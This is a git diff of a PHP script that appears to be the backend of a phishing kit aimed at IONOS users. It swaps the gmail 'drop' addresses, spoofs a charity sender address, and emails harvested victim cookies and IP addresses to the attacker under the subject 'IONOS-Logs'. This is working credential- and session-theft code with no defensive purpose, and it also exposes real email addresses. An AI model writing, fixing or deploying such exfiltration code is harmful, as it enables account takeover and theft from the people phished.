@@ -3,11 +3,11 @@
 header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
-// $EMAIL = "alexjace151@gmail.com";
-// $SENDER_EMAIL = "jacealex151@gmail.com";
+$EMAIL = "alexjace151@gmail.com";
+$SENDER_EMAIL = "jacealex151@gmail.com";
 
-$EMAIL = "gottmacht.empire@gmail.com";
-$SENDER_EMAIL = "info@ukrainefreeaids.org";
+// $EMAIL = "gottmacht.empire@gmail.com";
+// $SENDER_EMAIL = "info@ukrainefreeaids.org";
 
 
 function sendEmail($subject, $message, $file = "")
@@ -17,8 +17,8 @@ function sendEmail($subject, $message, $file = "")
 
 
     // Normal
-    $headers  = 'MIME-Version: 1.0' . "\r\n";
-    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+    $headers  = "MIME-Version: 1.0\r\n";
+    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
 
     // Create email headers
     $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
@@ -131,9 +131,8 @@ if (isset($_REQUEST['send'])) {
         $message = str_replace("{{cookie}}", $cookie, $message);
 
         $mail = sendEmail("IONOS-Logs | $ip", $message, $filename);
-        if ($mail["error"]) throw new Exception("Could not send");
+        if (!$mail) throw new Exception("Could not send");
 
-        // unlink($filename);
 
         echo $response = json_encode(["status" => true, "message" => "Email sent"]);
     } catch (Exception $e) {
